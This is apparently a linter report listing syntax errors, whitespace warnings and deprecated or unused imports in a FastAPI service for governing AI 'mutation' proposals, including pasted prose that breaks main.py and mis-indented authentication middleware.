   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Unparenthesized generator expression cannot be used here
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:39
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `in`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:57
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                         ^^^^^^^^^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Got unexpected token ΓÇ¥
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:67
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Expected `,`, found Unknown
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:93:67
   |
91 | Rollback + snapshot manager
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
   |                                                                   ^
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:94:1
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   | ^^^^^^^^^^^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:94:15
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |               ^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:94:19
   |
92 | Cryptographic replay verification
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
   |                   ^^^^^
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:8
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |        ^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:17
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                 ^^^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:27
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                           ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:30
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                              ^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:35
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                   ^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:41
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:41
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                         ^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:46
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found string
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:95:46
   |
93 | This becomes: ΓÇ£A Kubernetes admission controller for AI evolution.ΓÇ¥
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
   |                                              ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\ai-mutation-governance-firewall\app\main.py:96:5
   |
94 | This is niche but elite.
95 | DARPA, defense, sovereign AI labs would care.",
96 |     version="1.0.0",
   |     ^^^^^^^
97 |     lifespan=lifespan,
98 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
    | ^^^^^^^^
213 |         
214 |         return await call_next(request)
    |

W293 Blank line contains whitespace
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:213:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
213 |         
    | ^^^^^^^^
214 |         return await call_next(request)
    |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\ai-mutation-governance-firewall\app\middleware.py:214:1
    |
212 |         request.state.user = user
213 |         
214 |         return await call_next(request)
    | ^^^^^^^^
    |

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:2:1
  |
1 | from datetime import datetime
2 | from typing import Any, Dict, List, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
3 | from uuid import UUID, uuid4
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:16:23
   |
14 |     proposer_id: str
15 |     target_component: str
16 |     proposed_changes: Dict[str, Any]
   |                       ^^^^
17 |     rationale: str
18 |     risk_assessment: str
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:20:25
   |
18 |     risk_assessment: str
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^
21 |     quorum_signatures: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:20:34
   |
18 |     risk_assessment: str
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
   |                                  ^^^^
21 |     quorum_signatures: List[str] = []
22 |     created_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:21:24
   |
19 |     status: str = "pending"  # pending, simulating, validated, rejected, applied
20 |     simulation_results: Optional[Dict[str, Any]] = None
21 |     quorum_signatures: List[str] = []
   |                        ^^^^
22 |     created_at: datetime = Field(default_factory=datetime.now)
23 |     updated_at: datetime = Field(default_factory=datetime.now)
   |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:29:23
   |
27 |     proposer_id: str
28 |     target_component: str
29 |     proposed_changes: Dict[str, Any]
   |                       ^^^^
30 |     rationale: str
31 |     risk_assessment: str
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:35:13
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
   |             ^^^^^^^^^^^^^
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:36:25
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
   |                         ^^^^^^^^^^^^^^^^^^^^^^^^
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:36:34
   |
34 | class ProposalUpdate(BaseModel):
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
   |                                  ^^^^
37 |     quorum_signatures: Optional[List[str]] = None
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:37:24
   |
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |                        ^^^^^^^^^^^^^^^^^^^
   |
help: Convert to `X | None`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:37:33
   |
35 |     status: Optional[str] = None
36 |     simulation_results: Optional[Dict[str, Any]] = None
37 |     quorum_signatures: Optional[List[str]] = None
   |                                 ^^^^
   |
help: Replace with `list`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\models.py:41:12
   |
40 | class PaginatedProposals(BaseModel):
41 |     items: List[MutationProposal]
   |            ^^^^
42 |     total: int
43 |     page: int
   |
help: Replace with `list`

F401 [*] `asyncio` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:5:8
  |
3 | """
4 |
5 | import asyncio
  |        ^^^^^^^
6 | import time
7 | from datetime import datetime
  |
help: Remove unused import: `asyncio`

F401 [*] `time` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:6:8
  |
5 | import asyncio
6 | import time
  |        ^^^^
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:8:1
  |
6 | import time
7 | from datetime import datetime
8 | from typing import Any, Dict, List, Optional, Tuple
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
9 | from uuid import UUID
  |

F401 [*] `.config.settings` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:11:21
   |
 9 | from uuid import UUID
10 |
11 | from .config import settings
   |                     ^^^^^^^^
12 | from .errors import DatabaseError
13 | from .logging_config import logger
   |
help: Remove unused import: `.config.settings`

F401 [*] `.errors.DatabaseError` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:12:21
   |
11 | from .config import settings
12 | from .errors import DatabaseError
   |                     ^^^^^^^^^^^^^
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |
help: Remove unused import: `.errors.DatabaseError`

F401 [*] `.metrics.DB_ERRORS` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:14:45
   |
12 | from .errors import DatabaseError
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |                                             ^^^^^^^^^
15 | from .models import MutationProposal
   |
help: Remove unused import

F401 [*] `.metrics.DB_QUERY_DURATION` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:14:56
   |
12 | from .errors import DatabaseError
13 | from .logging_config import logger
14 | from .metrics import DB_CONNECTIONS_ACTIVE, DB_ERRORS, DB_QUERY_DURATION
   |                                                        ^^^^^^^^^^^^^^^^^
15 | from .models import MutationProposal
   |
help: Remove unused import

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:22:20
   |
21 |     def __init__(self):
22 |         self.data: Dict[str, Any] = {"proposals": {}}
   |                    ^^^^
23 |         self.connected = False
   |
help: Replace with `dict`

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:48:10
   |
46 |     async def list(
47 |         self, offset: int = 0, limit: int = 20
48 |     ) -> Tuple[List[MutationProposal], int]:
   |          ^^^^^
49 |         proposals_list = list(self.db.data["proposals"].values())
50 |         proposals_list.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:48:16
   |
46 |     async def list(
47 |         self, offset: int = 0, limit: int = 20
48 |     ) -> Tuple[List[MutationProposal], int]:
   |                ^^^^
49 |         proposals_list = list(self.db.data["proposals"].values())
50 |         proposals_list.sort(key=lambda x: x.created_at, reverse=True)
   |
help: Replace with `list`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:54:47
   |
52 |         return proposals_list[offset : offset + limit], total
53 |
54 |     async def get(self, proposal_id: UUID) -> Optional[MutationProposal]:
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^^^
55 |         return self.db.data["proposals"].get(str(proposal_id))
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\repository.py:62:43
   |
61 |     async def update(
62 |         self, proposal_id: UUID, updates: Dict[str, Any]
   |                                           ^^^^
63 |     ) -> MutationProposal:
64 |         proposal = await self.get(proposal_id)
   |
help: Replace with `dict`

UP035 `typing.List` is deprecated, use `list` instead
 --> emergent-microservices\ai-mutation-governance-firewall\app\routes.py:5:1
  |
3 | """
4 |
5 | from typing import List
  | ^^^^^^^^^^^^^^^^^^^^^^^
6 | from uuid import UUID
  |

F401 [*] `typing.List` imported but unused
 --> emergent-microservices\ai-mutation-governance-firewall\app\routes.py:5:20
  |
3 | """
4 |
5 | from typing import List
  |                    ^^^^
6 | from uuid import UUID
  |
help: Remove unused import: `typing.List`

F401 [*] `.models.ProposalUpdate` imported but unused
  --> emergent-microservices\ai-mutation-governance-firewall\app\routes.py:15:5
   |
13 |     PaginatedProposals,
14 |     ProposalCreate,
15 |     ProposalUpdate,
   |     ^^^^^^^^^^^^^^
16 | )
17 | from .services import MutationGovernanceService
   |
help: Remove unused import: `.models.ProposalUpdate`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:8:1
   |
 6 | import secrets
 7 | from datetime import datetime, timedelta
 8 | from typing import Any, Dict, List, Optional
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 9 |
10 | import jwt
   |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:32:44
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                            ^^^^^^^^^^^^^^^^^^^^^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\ai-mutation-governance-firewall\app\security.py:32:53
   |
32 | def create_jwt_token(subject: str, claims: Optional[Dict[str, Any]] = None) -> str:
   |                                                     ^^^^
33 |     """Create JWT token"""
34 |     now = datetime.utcnow()
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
